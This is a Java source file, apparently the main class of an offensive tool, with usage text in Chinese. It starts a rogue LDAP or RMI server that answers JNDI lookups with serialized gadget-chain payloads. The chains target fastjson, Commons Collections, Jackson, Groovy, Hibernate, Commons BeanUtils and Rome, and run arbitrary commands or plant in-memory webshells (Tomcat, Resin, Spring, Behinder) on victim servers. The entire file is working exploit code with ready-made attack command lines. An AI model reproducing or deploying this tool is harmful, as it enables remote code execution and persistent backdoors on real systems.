package org.c3p0ooo;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import org.apache.commons.cli.*;
import org.gadget.inter.Gadget;
import org.interceptor.SerialOperationInterceptor;
import org.util.GadgetUtils;
import sun.misc.BASE64Decoder;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.FileInputStream;
import java.net.InetAddress;
import java.util.UUID;

public class LDAPRefServer {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main(String[] args) throws Exception {
        // 创建 Options 对象
        Options options = new Options();
        // 添加选项
        options.addOption("p", "port", true, "监听的端口，默认1389");
        options.addOption("f", "file", true, "反序列化打法：序列化数据文件路径");
        options.addOption("b", "base64", true, "反序列化打法：序列化数据base64编码值");
        options.addOption("C", "class", true, "低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）");
        options.addOption("g", "gadget", true, "内置反序列化链");
        options.addOption("c", "cmd", true, "使用内置反序列化链时所要执行的命令，或指定所要打的内存马类型（存在空格时请使用双引号包裹）");
        options.addOption("rmi", "rmi", false, "rmi反序列化打法，可打JDK20+，只支持内置链打法");
        options.addOption("ip", "ip", true, "VPS-IP地址");
        options.addOption("path", "path", true, "内存马路径,格式为/xxx,不传入会生成一个随机地址,listener型内存马不需要");


        // 创建命令行解析器
        CommandLineParser parser = new DefaultParser();
        // 解析命令行参数
        CommandLine cmd = parser.parse(options, args);

        //监听的端口，默认1389
        Integer ldap_port;

        if (!cmd.hasOption("p")) {
            ldap_port = 1389;
        } else {
            ldap_port = Integer.valueOf(cmd.getOptionValue("p"));
        }

        String ip = "";
        if (cmd.hasOption("ip")) {
            ip = cmd.getOptionValue("ip");
        }


        //以下判断使用方式并执行
        if (cmd.hasOption("f")) {
            String filepath = cmd.getOptionValue("f");
            System.out.println("序列化文件：" + filepath);
            FileInputStream fis = new FileInputStream(filepath);
            byte[] bytes = new byte[fis.available()];
            fis.read(bytes);
            lanuchLDAPServer(ldap_port, bytes);
        } else if (cmd.hasOption("b")) {
            String base64_ser = cmd.getOptionValue("b");
            BASE64Decoder base64Decoder = new BASE64Decoder();
            byte[] decode = base64Decoder.decodeBuffer(base64_ser);
            lanuchLDAPServer(ldap_port, decode);
        } else if (cmd.hasOption("C")) {
            String url = cmd.getOptionValue("C");
            System.out.println("class文件地址：" + url);
            lanuchLDAPServer(ldap_port, url);
        } else if (cmd.hasOption("g")) {
            //内置链方式命令不能为空
            if (!cmd.hasOption("c")) {
                System.out.println("缺少'-c'参数");
                System.exit(0);
            }

            //判断输入的命令首位是否存在双引号，存在便过滤
            String command = cmd.getOptionValue("c");
            String gadgetName = cmd.getOptionValue("g");
            if (command.startsWith("\"") && command.endsWith("\"")) {
                command = command.substring(1, command.length() - 1);
            }

            String path;
            if (cmd.hasOption("path") && !cmd.getOptionValue("path").isEmpty()) {
                if (cmd.getOptionValue("path").startsWith("/")) {
                    path = cmd.getOptionValue("path");
                }else {
                    path = "/" + cmd.getOptionValue("path");
                }
            } else {
                path = "/" + UUID.randomUUID().toString().replace("-", "") + "/**";
            }

            //反射构造使用的内置链
            Gadget gadget = null;
            try {
                String className = (String) new ArgsBean().getMap().get(gadgetName);
                if (gadgetName.equals("execAll")) {
                    if (!cmd.hasOption("ip") || !cmd.hasOption("rmi")) {
                        System.out.println("请查看是否缺少'-ip'及'-rmi'参数");
                        System.exit(0);
                    }
                    gadget = (Gadget) GadgetUtils.getRefObj("org.gadget." + className, new Class[]{String.class, int.class}, new Object[]{ip, ldap_port});
                } else {
                    gadget = (Gadget) GadgetUtils.getRefObj("org.gadget." + className);
                }
            } catch (Exception e) {
                System.out.println("暂不支持该链！");
                System.exit(0);
            }

            System.out.println("使用" + gadgetName);
            System.out.println("执行的命令为：" + command);
            if (cmd.hasOption("rmi")) {
                System.out.println("使用RMI反序列化方式");
                System.out.println("客户端请求：rmi://ip:" + ldap_port + "/Exploit");
                new JRMPListener(ldap_port, gadget.getObject(command, path), command, gadgetName).run();
            } else {
                lanuchLDAPServer(ldap_port, GadgetUtils.getBytes(gadget, command, path));
            }
        } else {
            // 如果未提供选项，输出帮助信息
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("\n【使用】\n" +
                            "反序列化文件方式：java -jar LDAPDeserialize-tool.jar -p 1389 -f D:/1.ser\n" +
                            "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -p 1389 -b base64数据\n" +
                            "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
                            "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
                            "RMI反序列化打法：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
                            "RMI内置利用链遍历：\njava -jar LDAPDeserialize-tool.jar -g execAll -c \"calc\" -rmi -ip 当前服务器公网ip\n" +
                            "注入内存马：\njava -jar LDAPDeserialize-tool.jar -g fastjson -c TomcatListenerCMD\n" +
                            "\n" +
                            "【目前支持的链,*号为支持JDK20+的链】\n" +
                            "fastjson (依赖：1.2.49-1.2.83)\n" +
                            "* CC6 (依赖：<= commons-collections 3.2.1)\n" +
                            "CC4 (依赖：commons-collections4 4.0)\n" +
                            "jackson (依赖：jackson-databind 2.10.0及以上版本)\n" +
                            "jackson2 (稳定版，依赖：jackson-databind 2.10.0及以上版本 && <= spring aop 5.x)\n" +
                            "groovy (依赖：groovy 2.3.9)\n" +
                            "hibernate (依赖：hibernate 5.x && spring-context && reactor-core)" +
                            "[hibernate为ClassPathXmlApplicationContext执行，'-c'后跟上xml文件WEB地址]\n" +
                            "CB192 (依赖：commons-beanutils 1.9.2 && commons-logging 1.2)\n" +
                            "CB183 (依赖：commons-beanutils 1.8.3 && commons-logging 1.2)\n" +
                            "rome (依赖：Rome 1.0)\n" +
                            "execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)\n" +
                            "\n" +
                            "【目前支持的内存马类型】\n" +
                            "TomcatListenerCMD (tomcat listener型CMD内存马)\n" +
                            "TomcatListenerBehinder (tomcat listener型冰蝎4.1内存马)\n" +
                            "TomcatListenerBehinderByLei (tomcat listener型冰蝎内存马,需使用改版的冰蝎)\n" +
                            "ResinListenerCMD (Resin listener型CMD内存马)\n" +
                            "ResinListenerBehinder (Resin listener型冰蝎4.1内存马)\n" +
                            "SpringInterceptorBehinder (Spring Interceptor型冰蝎4.1内存马)\n" +
                            "\n"
                    , options);
        }
    }

    public static void setMemShell() {

    }

    public static void lanuchLDAPServer(Integer ldap_port, Object obj) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new SerialOperationInterceptor(obj));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            System.out.println("客户端请求：ldap://ip:" + ldap_port + "/Exploit（名字随意）");
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
